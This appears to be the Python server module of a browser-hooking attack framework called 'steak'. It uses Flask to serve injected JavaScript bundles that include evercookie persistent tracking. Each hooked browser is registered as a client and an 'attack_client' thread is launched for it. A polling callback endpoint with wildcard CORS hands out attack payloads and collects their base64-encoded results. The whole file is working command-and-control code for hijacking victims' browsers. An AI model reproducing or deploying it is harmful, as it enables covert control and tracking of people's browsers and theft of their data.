from steak.Client import Client
from flask import Flask,Response,request
import uuid
import os
import json
import queue
from .utils import uniquerandstring
from .utils import base64decode,base64encode
import _thread

class Server:
    def __init__(self,ip,port,projects,callbackpath) -> None:
        print('fuckserver')
        self.ip=ip
        self.port=port
        self.projects=projects
        self.callbackpath=callbackpath
        self.jsurl2projects={}
        self.clientid2client={}
        self.taskid2payloadobj={}
        self.clientids=set()
        self.loadjsmodules()
        for project in self.projects:
            if project.jsurl in self.jsurl2projects:
                raise ValueError('Js URL cannot be replicate🐱🐱🐱🐱')
            self.jsurl2projects[project.jsurl]=project

    def readjs(self,jsname):
        return open(os.path.join(os.path.dirname(__file__),'./sources/'+jsname)).read()
    
    def getfullcalbackpath(self):
        return 'http://'+self.ip+':'+str(self.port)+self.callbackpath

    def loadjsmodules(self):
        self.jspredefjs=self.readjs('predef.js')
        self.jqueryjs=self.readjs('jquery.js')
        self.jsmain=self.readjs('main.js')       
        self.evercookiejs=self.readjs('evercookie.js')    
        self.swfobjectjs=self.readjs('swfobject-2.2.min.js')   
        self.base64js=self.readjs('base64.js')
    
    def generatejs(self,callbackpath,jsurl):
        return self.jqueryjs+self.swfobjectjs+self.base64js+self.evercookiejs+self.jspredefjs.format(callbackpath=callbackpath,jsurl=jsurl)+self.jsmain

    def _createclient(self,project):
        newclientid=uniquerandstring(self.clientids)
        self.clientids.add(newclientid)
        client=Client(newclientid,project)
        return client 

    def generateResponse(self,s):
        resp=Response(s)
        resp.headers['Access-Control-Allow-Origin'] ='*'
        return resp

    def run(self):
        print('server run run run ')
        app = Flask(__name__)
        app.config['SESSION_TYPE'] = 'filesystem'


        @app.route(self.callbackpath,methods=['GET','POST'])
        def callbackpath():
            content=json.loads(base64decode(request.form.get('content')))
            clientid=content['clientbasicinfo']['clientid']
            project=self.jsurl2projects[content['clientbasicinfo']['jsurl']]
            dataupload=content['dataupload']
            
            if clientid not in self.clientid2client:
                try:
                    client=Client(clientid,project,dataupload)
                except:
                    #Error Status
                    return self.generateResponse('Restart')
                self.clientid2client[clientid]=client
                project.clients[clientid]=client
                _thread.start_new_thread( project.attack_client, (client,))
                return self.generateResponse('')
            else:
                client=self.clientid2client[clientid]
            
            if dataupload!="Rollback":
                #receiv result
                taskid=content['clientbasicinfo']['taskid']
                payloadobj=self.taskid2payloadobj[taskid]
                result=payloadobj.module.parseResult(dataupload)
                client.taskresult[taskid]=result
                del self.taskid2payloadobj[taskid]
                return self.generateResponse('')
            
            #send cmd
            task=client.getlatesttask()
            if task:
                self.taskid2payloadobj[task.taskid]=task
                return self.generateResponse(task.payload_str)
            else:
                return self.generateResponse('')
            

        @app.route('/', defaults={'path': ''})
        @app.route('/<path:path>')
        def handle_request(path):
            path='/'+path
            if path in self.jsurl2projects:
                project=self.jsurl2projects[path]
            else:
                return ''
            resp=Response(self.generatejs(self.getfullcalbackpath(),project.jsurl))
            resp.headers['Content-Type'] = 'text/javascript;charset=UTF-8'
            return resp

        app.run(host=self.ip,port=self.port)